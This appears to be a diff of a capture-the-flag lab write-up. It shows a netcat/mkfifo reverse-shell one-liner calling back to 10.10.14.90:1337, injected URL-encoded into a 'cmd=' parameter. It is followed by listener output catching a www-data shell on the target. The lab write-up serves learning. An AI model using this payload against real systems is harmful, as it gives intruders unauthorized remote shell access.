@@ -215,5 +215,16 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.90 1337 >/tmp/f
 Ill use the same method as before just place this in the `cmd=` parameter making sure its URL encoded
 
 ```python
-
+penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => reset 10.129.234.130 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
+[+] Upgrading shell to PTY...
+[+] PTY upgrade successful via /usr/bin/python3
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/reset~10.129.234.130-Linux-x86_64/2026_04_20-17_22_41-167.log
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+www-data@reset:/var/www/html$ 
 ```
+I now have a shell
+
